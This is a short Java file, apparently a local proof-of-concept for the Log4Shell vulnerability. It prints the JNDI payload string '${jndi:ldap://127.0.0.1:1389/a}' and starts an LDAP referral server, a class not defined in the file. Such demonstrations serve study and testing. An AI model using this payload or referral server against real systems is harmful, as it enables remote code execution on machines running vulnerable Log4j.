
public class Main {

    public static void main(String[] args) {
        System.out.println("Payload: ${jndi:ldap://127.0.0.1:1389/a}");
        LDAPRefServer ldapRefServer = new LDAPRefServer("Hello world from Log4j");
        ldapRefServer.startServer();
    }

}
